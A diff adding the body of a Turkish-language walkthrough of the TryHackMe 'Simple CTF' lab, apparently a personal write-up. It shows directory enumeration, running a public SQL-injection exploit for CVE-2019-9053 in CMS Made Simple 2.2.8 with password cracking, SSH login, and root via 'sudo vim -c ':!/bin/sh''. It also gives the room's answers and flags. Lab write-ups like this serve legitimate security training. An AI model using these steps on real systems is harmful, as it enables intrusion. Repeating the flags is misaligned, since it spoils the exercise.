@@ -2,7 +2,7 @@
 
 Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/easyctf">Simple CTF</a> makinesinin çözümünü paylaşacağım.
 
-Başlatalım.
+Başlayalım.
 
 * * *
 
@@ -61,5 +61,125 @@ Nmap done: 1 IP address (1 host up) scanned in 99.41 seconds
 En yüksek portta hangi hizmet çalışıyor?
 
 - ssh
+
+80 portunda websitesi çalışıyor siteyi kontrol edelim.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a1.png?raw=true)
+
+Sıradan ubuntu default sayfası. 
+
+Gobuster çalıştırarak gizli dizin arayalım.
+
+```
+┌──(root㉿r3tr0)-[~]
+└─# gobuster dir -u http://10.10.118.25/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+```
+
+Gobuster çıktısı:
+
+```
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.118.25/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/simple               (Status: 301) [Size: 313] [--> http://10.10.118.25/simple/]
+```
+
+simple sayfasını buluyoruz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a2.png?raw=true)
+
+Siteyi incelediğimizde CMS Made Simple 2.2.8 versiyonu kullanıldığını görüyoruz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a3.png?raw=true)
+
+
+Google'a gidip "CMS Made Simple 2.2.8 exploit" ifadesini aratarak bu sürümle ilgili herhangi bir şey olup olmadığına bakalım.
+
+
+Sonuçlara baktığımızda, Exploit-DB'de aramamızla eşleşen ve CVE-2019–9053 kullanan bir SQL enjeksiyon saldırısına atıfta bulunan bir sayfa görüyoruz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a4.png?raw=true)
+
+Uygulamaya karşı kullandığınız CVE nedir?
+
+- CVE-2019-9053
+
+
+Uygulama ne tür bir güvenlik açığına karşı savunmasızdır?
+
+- SQLi
+
+Exploit'i indirelim ve çalıştıralım.
+
+```
+┌──(root㉿r3tr0)-[/home/kali/Downloads]
+└─# python3 46635.py
+[+] Specify an url target
+[+] Example usage (no cracking password): exploit.py -u http://target-uri
+[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
+[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
+```
+
+Bizden istediği parametreleri girelim.
+
+```
+┌──(root㉿r3tr0)-[/home/kali/Downloads]
+└─# python3 46635.py -u http://10.10.118.25/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a5.png?raw=true)
+
+Kullanıcı adı ve şifreyi buluyoruz.
+
+Şifre nedir?
+- secret
+
+Elde edilen bilgilerle nereden giriş yapabilirsiniz?
+- SSH
+
+SSH ile makineye bağlanalım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a6.png?raw=true)
+
+user bayrağını alalım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a7.png?raw=true)
+
+Kullanıcı bayrağı nedir?
+
+- G00d j0b, keep up!
+
+Yetki yükselmeye geçelim. Öncelikle mevcut kullanıcının neyi çalıştırabileceğini görmek için “sudo -l” komutunu çalıştıralım.
+
+```
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+“Mitch” kullanıcısının /usr/bin/vim'i şifre olmadan çalıştırabildiğini görüyoruz. Bu bilgilerle GTFOBins'e göz atalım ve bunu privesc için kullanıp kullanamayacağımıza bakalım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a8.png?raw=true)
+
+sudo vim -c ':!/bin/sh' komutunu kullanarak yetki yükseltebiliriz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a9.png?raw=true)
+
+Root bayrağı nedir?
+
+-W3ll d0n3. You made it!
+
+Ve böylece bir ctf daha tamamladık. Gelecek yazılarımda görüşmek üzere.
 
 
